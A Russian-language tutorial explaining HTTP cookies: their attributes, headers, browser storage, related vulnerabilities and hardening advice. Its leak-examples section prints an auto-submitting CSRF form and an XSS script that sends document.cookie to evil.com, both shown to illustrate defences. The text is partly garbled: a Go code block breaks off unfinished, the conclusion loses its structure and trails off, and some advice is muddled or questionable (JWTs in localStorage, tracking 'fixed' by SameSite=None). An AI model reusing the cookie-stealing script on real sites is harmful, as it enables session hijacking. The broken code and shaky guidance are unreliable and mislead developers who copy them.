# 🧠 Что такое кука?

**HTTP Cookie** — это небольшой фрагмент данных, который сайт отправляет браузеру, чтобы запомнить состояние или пользователя между запросами.

📌 Пример: ты залогинился → сервер отправил тебе куку `session_id=abc123`  
При каждом следующем запросе твой браузер автоматически добавляет эту куку в заголовки

---

## 🔐 Структура куки: что входит в неё

### 1. **Имя=Value**

```text
session_id=abc123
```

- `session_id` — имя
- `abc123` — значение
- Оба могут быть строками, числами, JSON и т.д.

---

### 2. **Domain**

```text
Domain=example.com
```

- Определяет, какие домены получат куку
- Например, если указано `Domain=.example.com` → кука будет доступна для `example.com`, `auth.example.com`, `blog.example.com`

📌 Без указания `Domain` — кука относится только к текущему хосту (`myapp.com`, но не `api.myapp.com`)

---

### 3. **Path**

```text
Path=/admin
```

- Ограничивает использование куки определённым путём
- Например, кука будет отправляться только при запросах `/admin/...`

---

### 4. **Expires / Max-Age**

```text
Max-Age=3600
Expires=Wed, 07 Oct 2025 12:00:00 GMT
```

- Указывает время жизни куки
- `Max-Age` — сколько секунд жить
- `Expires` — конкретная дата истечения

📌 Если ни один из них не указан → кука временная (session cookie), умирает при закрытии браузера

---

### 5. **Secure**

```text
Secure
```

- Кука передаётся **только через HTTPS**
- Не отправляется по HTTP → защищает от прослушки

---

### 6. **HttpOnly**

```text
HttpOnly
```

- Запрещает чтение куки через JavaScript
- Защищает от XSS-атак (например, через `document.cookie`)

---

### 7. **SameSite**

```text
SameSite=Strict
SameSite=Lax
SameSite=None; Secure
```

Один из самых важных атрибутов в современных браузерах:

| Значение | Что значит |
|---------|-------------|
| `SameSite=Strict` | Отправляем только если запрос сделан с того же сайта |
| `SameSite=Lax`   | Некоторые GET-запросы разрешены |
| `SameSite=None`  | Разрешено со всех сайтов, но **обязательно должен быть `Secure`**

---

### 8. **Partitioned (новое)**

```text
Partitioned
```

- Появилось в Chrome 122+
- Используется для **изоляции кук между сайтами**, даже если `SameSite` не установлен
- Полезно против **CSRF** и **tracking cookies**

---

### 9. **Priority (экспериментальный)**

```text
Priority=High
```

- Браузеры могут управлять приоритетом кук
- Высокий приоритет = чаще читается и пишется

## 📦 Как выглядит кука в HTTP-заголовке?

### На стороне сервера:

```http
Set-Cookie: session_id=abc123; Path=/; Domain=example.com; HttpOnly; Secure; SameSite=Strict
```

### На стороне клиента (браузер):

Кука **автоматически добавляется** в заголовки:

```http
GET /profile HTTP/1.1
Host: example.com
Cookie: session_id=abc123
```

---

## 🛠️ Как хранятся куки в браузере?

Все куки сохраняются в **постоянном хранилище** (если указан `Expires`) или во временном (`Session`).

Браузер делает проверки:
- Совпадает ли `Domain`?
- Подходит ли `Path`?
- Есть ли флаг `Secure`? (HTTPS)
- Разрешена ли отправка кросс-доменного запроса? (`SameSite`)

---

## 🧩 Как устроены куки на уровне памяти?

Каждая кука содержит:

| Поле | Описание |
|------|----------|
| `Name` | Имя куки |
| `Value` | Значение куки |
| `Domain` | Домен, которому принадлежит |
| `Path` | Путь, где она работает |
| `Expires` | Время жизни |
| `IsHttpOnly` | Может ли JS её прочитать |
| `IsSecure` | Только через HTTPS |
| `SameSite` | Политика кросс-сайта |

В Go, например, это может выглядеть так:

```go
cookie := &http.Cookie{
    Name:     "session_id",
    Value:    "abc123",
    Path:     "/",
    Domain:   "example.com",
    MaxAge:   3600,
    Secure:   true,
    HttpOnly: true,
    SameSite: http.SameSiteStrictMode,
}
```

## 🧠 Как куки взаимодействуют с другими механизмами безопасности?

| Механизм | Как влияет на куки |
|----------|--------------------|
| **SameSite** | Ограничивает отправку кук при кросс-сайт запросах |
| **CORS** | Не блокирует куки, но позволяет ограничить их через политики |
| **CSRF** | Если кука без `SameSite` → можно обмануть браузер и сделать запрос от имени пользователя |
| **XSS** | Если кука не `HttpOnly` → JS может украсть данные |
| **Content-Security-Policy (CSP)** | Может блокировать установку кук через JS, если используется строгое правило |

---

## 🚨 Уязвимости, связанные с куками

| Угроза | Почему возникает | Как защититься |
|--------|------------------|----------------|
| **XSS** | Через JS-скрипты ввода | Использовать `HttpOnly` |
| **CSRF** | Злоумышленник заставляет браузер отправить куку | `SameSite=Strict/Lax`, CSRF token |
| **Session fixation** | Злоумышленник предоставляет готовую сессию | Генерируй новую сессию при логине |
| **Session hijacking** | Перехват куки через MITM | `Secure + HttpOnly` |
| **Tracking** | Кросс-доменные куки отслеживают пользователей | `SameSite=None` только с `Secure` |
| **Replay attack** | Использование старой куки | Используй короткие сроки жизни |
| **Cookie poisoning** | Изменение куки на клиенте | Сервер должен **не доверять кукам**, а проверять подпись |

## 📌 Как работают куки на уровне браузера?

### Шаг 1: Получение `Set-Cookie` заголовка

```http
HTTP/1.1 200 OK
Set-Cookie: user=alice; Path=/; Secure; HttpOnly; SameSite=Strict
```

### Шаг 2: Браузер сохраняет куку

Сохраняет:
- По домену
- По пути
- По времени истечения

### Шаг 3: При последующих запросах браузер добавляет:

```http
GET /profile HTTP/1.1
Host: example.com
Cookie: user=alice
```

## 🧱 Как устроены куки внутри движка браузера?

Например, в Chromium:

- Куки хранятся в базе данных SQLite (`cookies` файл)
- Каждая запись имеет:
  - `creation_utc` — когда создана
  - `expires_utc` — когда истекает
  - `host_key` — домен
  - `path` — путь
  - `name` — имя куки
  - `value` — значение
  - `secure` — безопасность
  - `httponly` — только для HTTP
  - `samesite` — уровень SameSite

---

## 🧪 Как куки взаимодействуют с JavaScript?

Если кука **не помечена как `HttpOnly`** → JS может её читать и менять:

```javascript
document.cookie = "user=alice";
console.log(document.cookie); // "user=alice"
```

⚠️ Это опасно: если страница уязвима к XSS → злоумышленник может украсть куки

## 📋 Какие ещё виды кук бывают?

| Тип | Описание |
|-----|----------|
| **Session cookie** | Живёт до закрытия браузера |
| **Persistent cookie** | Имеет `Expires` или `Max-Age` |
| **Secure cookie** | Только через HTTPS |
| **HttpOnly cookie** | Не видна в `document.cookie` |
| **Third-party cookie** | Установлена с другого домена (iframe, ad, tracking pixel) |
| **Partitioned cookie** | Изолирована между сайтами |
| **Signed cookie** | Подписана сервером (например, HMAC) |
| **Encrypted cookie** | Зашифрована (например, AES-GCM) |

---

## 🧰 Как проверить куки в браузере?

1. Открой DevTools → Application → Cookies
2. Или вручную через консоль:

```javascript
document.cookie
```

❗ Но если кука `HttpOnly` → она **не покажется** в этом списке

## 🛡️ Как правильно использовать куки?

| Что делать | Как делать |
|------------|-------------|
| Хранить сессию | Используй `session_id`, не храните пароли |
| Убедись, что кука `Secure` | Используй `Set-Cookie` с `Secure` |
| Добавь `HttpOnly` | Чтобы JS не мог её прочитать |
| Установи `SameSite=Strict` | Для максимальной защиты от CSRF |
| Используй подпись или шифрование | Например, `HMAC-SHA256(session_id)` |
| Убедись, что кука устанавливается на нужный `Path` | Чтобы не слать лишнее |
| Используй `Max-Age`, а не `Expires` | Легче контролировать время жизни |
| Проверяй куки на сервере | Не только наличие, но и целостность |
| Используй `Partitioned` куки | Для изоляции между сайтами |

```go
http.SetCookie(w, &http.Cookie{

    Path:     "/",

    HttpOnly: true,

```

## 🧩 А что насчёт `Partitioned` кук?

```http
Set-Cookie: session=abc123; Partitioned; SameSite=None; Secure
```

📌 `Partitioned` куки:
- Изолируются между сайтами (например, `facebook.com` и `thirdparty-ad.com`)
- Предотвращают cross-site tracking
- Появились в Chrome 122+

## 📊 Примеры утечки кук

### 1. **CSRF атака через форму**

```html
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="hacker_account" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>
  document.forms[0].submit();
</script>
```

➡️ Кука `session_id` отправляется автоматически, потому что ты авторизован

---

### 2. **XSS → кража куки**

```html
<script>
fetch("https://evil.com/log", {
  method: "POST",
  body: document.cookie
});
</script>
```

➡️ Если кука **не `HttpOnly`** → JS может её украсть

## 📌 Когда куки хороши, а когда плохи?

| Сценарий | Использовать куки? |
|---------|--------------------|
| Авторизация | ✅ Да, но с `HttpOnly`, `Secure`, `SameSite=Strict` |
| API ключи | ❌ Лучше использовать `Authorization: Bearer ...` |
| CSRF protection | ✅ С помощью `SameSite`, `HttpOnly`, `Double Submit Cookie` |
| Отслеживание пользователей | ⚠️ Можно, но всё больше ограничений |
| Хранение чувствительных данных | ❌ Никогда не хранить пароли, токены и т.д. в куках |
| Локальное хранение | ✅ Для внутренних сервисов |
| OAuth2 | ❌ Лучше использовать `Authorization` заголовок |
| JWT | ❌ Лучше хранить в `localStorage` или `IndexedDB`, но не в куках |
| Session ID | ✅ Да, но с правильными флагами |

## 🧱 Как куки взаимодействуют с другими системами?

| Система | Взаимодействует? |
|--------|------------------|
| **OAuth2** | ❌ Лучше использовать `Authorization` |
| **JWT** | ❌ То же самое — лучше в заголовке |
| **Single Sign-On** | ✅ Очень часто используются куки |
| **SAML** | ✅ Также частично на основе кук |
| **OpenID Connect** | ✅ Может использовать куки для SSO |
| **gRPC** | ❌ Использует `metadata.NewIncomingContext()` |
| **WebSockets** | ✅ Но нельзя использовать `HttpOnly` |
| **Service Workers** | ✅ Но не все флаги поддерживаются |

## 📈 Какие метрики важно отслеживать?

| Что отслеживать | Почему |
|----------------|--------|
| Частота обновления кук | Чтобы избежать утечек |
| Истечение кук | Чтобы не было долгоживущих сессий |
| Размер кук | Большое количество кук замедляет загрузку |
| `SameSite` политики | Защита от CSRF |
| `HttpOnly` | Защита от XSS |
| `Secure` | Защита от перехвата |
| Логирование ошибок кук | Чтобы понимать, почему пользователь теряет сессию |

## 📌 Вывод

> ✅ **Куки** — мощный инструмент, но требует осторожности  
> 🧠 Они состоят из нескольких частей:
- `Name=Value`
- `Domain`
- `Path`
- `Expires` / `Max-Age`
- `Secure`, `HttpOnly`, `SameSite`
- `Partitioned` (новое)

> 🔒 Без правильных флагов:
- Можно украсть через XSS
- Можно использовать в CSRF
- Можно отследить пользователя

- Для сессий
- Для простых задач
- Для монолитных приложений

> 🤖 Избегай кук:
